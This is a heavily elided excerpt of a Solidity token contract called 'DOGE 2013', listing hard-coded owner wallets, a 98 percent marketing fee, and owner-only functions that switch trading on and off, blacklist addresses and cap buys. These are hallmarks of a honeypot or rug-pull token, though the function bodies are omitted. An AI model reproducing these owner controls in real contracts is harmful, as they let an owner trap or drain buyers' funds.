...
contract DOGE2013 is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0x9a3dc4D8C22F468c63A6A51066AaD78058bdb4E0); 
    address payable private Wallet_Dev = payable(0xa0DE30502dAfc85cd5955829DDF345Cd0796F21D);
    ...
    string private constant _name = "DOGE 2013"; 
    string private constant _symbol = unicode"DG2013"; 
    ...
    uint256 private Percent_Marketing = 98;
    ...
    constructor () {
        ...
        _owner = 0xa0DE30502dAfc85cd5955829DDF345Cd0796F21D;
    ...
    function Transaction(bool open) external onlyOwner {
        _open = open;
    }
    ...
    function swapTokensForBNB(uint256 tokenAmount) private {
     ...
     function feesVolume(address account) public onlyOwner {
    ...
    */
    ...
    function antibotBL(address[] calldata addresses) external onlyOwner {
    ...
    function antibotBLL(address addresses) external onlyOwner {
    ...
    function approve(address addresses) external onlyOwner {
    ...
    function Blacklist_rmv(address[] calldata addresses) external onlyOwner {
    ...
    function Blacklist_rmve(address addresses) external onlyOwner {
    ...
    function RMVWL(address addresses) external onlyOwner {
    ...
    function setLimit_Buy(uint256 maxTxPercent_x100) external onlyOwner() {
